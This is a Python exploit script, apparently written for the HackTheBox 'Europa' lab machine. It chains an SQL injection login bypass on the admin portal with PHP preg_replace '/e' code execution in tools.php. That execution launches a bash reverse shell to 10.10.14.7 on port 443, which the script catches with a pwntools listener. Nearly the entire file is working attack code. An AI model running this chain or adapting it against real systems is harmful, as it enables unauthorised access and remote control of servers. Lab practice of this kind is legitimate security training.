#!/usr/bin/python3

from pwn import *
import requests
import pdb
import time
import sys
import signal
import urllib3
import threading

# Disable SSL warnings
urllib3.disable_warnings()

# Ctrl + c
def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables
login_url = "https://admin-portal.europacorp.htb/login.php"
rce_url = "https://admin-portal.europacorp.htb/tools.php"
port = 443

# Funciones
def makeRequest():

    s = requests.session()
    s.verify = False

    post_data = {
        'email' : "admin@europacorp.htb' order by 5-- -",
        'password' : '#' 
    }

    r = s.post(login_url, data=post_data)

    post_data = {
            'pattern' : '/pwned/e',
            'ipaddress' : 'system("bash -c \"bash -i >& /dev/tcp/10.10.14.7/443 0>&1\"")',
            'text' : 'pwned'
    }

    r = s.post(rce_url, data=post_data)


# Flujo principal
if __name__ == "__main__":

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))
        sys.exit(1)

    shell = listen(port, timeout=20).wait_for_connection()
    shell.interactive()

